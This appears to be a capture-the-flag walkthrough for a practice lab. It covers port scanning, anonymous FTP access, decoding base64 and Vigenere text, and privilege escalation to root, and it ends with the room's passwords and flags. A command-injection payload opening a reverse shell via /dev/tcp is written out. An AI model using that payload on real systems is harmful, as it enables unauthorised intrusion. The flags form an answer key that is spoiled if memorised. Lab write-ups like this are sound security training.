
```
└─# nmap -p-  10.10.114.238 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-15 13:19 UTC
Nmap scan report for ip-10-10-114-238.eu-west-1.compute.internal (10.10.114.238)
Host is up (0.0016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:89:2F:08:2C:0D (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.81 seconds
```

```
─# nmap -p 21,22,80 -sVC 10.10.114.238 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-15 13:24 UTC
Nmap scan report for ip-10-10-114-238.eu-west-1.compute.internal (10.10.114.238)
Host is up (0.00027s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.189.148
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ddfd8894f8c8d11b51e37df81ddd823e (RSA)
|   256 3eba38632b8d1c6813d505ba7aaed93b (ECDSA)
|_  256 c0a6a364441ecf475f85f61f784c59d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
MAC Address: 02:89:2F:08:2C:0D (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
```

```
ftp 10.10.114.238
login: anonymous
password: 

ls 
dad_tasks 
get dad_tasks 
```

```
cat dad_tasks 

UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds   

cat dad_tasks | base64 -d

Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl 

-> Classical Vingenere 

Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes 

```

```
ssh weston@10.10.114.238
password: Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

```
sudo -l 
find / -type f -user cage 2>/dev/null

/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
```


```
> /opt/.dads_scripts/.files/.quotes
> vi /opt/.dads_scripts/.files/.quotes

; bash -c 'exec bash -i &>/dev/tcp/<local_ip>/12345 <&1'
```

```
nc -nlvp 12345
```

```
cat Super_Duper_Checklist

1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
```

```
cd email_backup 
cat email_3

From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com
Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote                                                                                                     
down what it said. Could you look into it please? I think it could be something to do with his                                                                                                  
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty                                                                                                    
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...                                                                                                       
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!!                                                                                                              
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha                                                                                                               
ahahahhahaha. Ahhh Face it... he's just odd.

Regards

The Legend - Cage  
```

```
vigenere cipher with face -> haiinspsyanileph -> cageisnotalegend
```

```
weston@national-treasure:/home$ su root 
Password: cageisnotalegend

cd /root
cd email_backup
cat email_1 

From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer
root@national-treasure:~/email_backup# cat email_2 
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

Thank you

Sean Archer
```

#### Questions

What is Weston's password?  
```
Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

What's the user flag?  
```
THM{M37AL_0R_P3N_T35T1NG}
```

What's the root flag?
```
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```
